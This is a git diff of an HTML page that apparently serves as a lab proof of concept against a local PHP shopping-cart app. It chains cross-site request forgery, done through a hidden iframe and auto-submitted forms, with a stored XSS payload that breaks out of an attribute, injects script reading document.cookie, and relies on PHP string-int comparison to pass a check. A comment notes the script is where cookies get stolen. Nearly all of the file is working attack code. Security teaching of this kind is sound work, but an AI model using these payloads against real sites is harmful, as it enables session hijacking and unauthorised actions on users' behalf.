@@ -2,16 +2,20 @@
     <head></head>
     <body>
         <script>
-        let iframe = document.createElement("iframe");
-        iframe.name = "myTarget";
-        iframe.style.display = "none";
-
         /*
             In this script you steal the cookies somehow.
             The one prepending the script is necessary to pass the check in updateCart
             since in PHP you can compare strings with ints.
         */
-        let dangerousJS = "1<scri"+"pt>alert(document.cookie);</scr"+"ipt>";
+        let dangerousJS = "1\" /><scri"+"pt>alert(document.cookie);</scr"+"ipt><img style=\"display: none;";
+
+        // What's prefixing e.g. index.php in the URL.
+        let baseURL = "http://localhost:8080/";
+
+
+        let iframe = document.createElement("iframe");
+        iframe.name = "myTarget";
+        iframe.style.display = "none";
 
         function csrf(url, data={}) {
             let form = document.createElement("form");
@@ -38,10 +42,10 @@
         window.addEventListener("load", function () {
             document.body.appendChild(iframe);
             iframe.onload = function (event){
-                csrf("http://localhost:8080/receipt.php");
+                csrf(baseURL + "cart.php");
                 iframe.onload = function (){};
             };
-            csrf("http://localhost:8080/updateCart.php", {'action': "set", 'product': 1, 'quantity': dangerousJS});
+            csrf(baseURL + "updateCart_vulnerable.php", {'action': "set", 'product': 1, 'quantity': dangerousJS});
         });
         </script>
     </body>
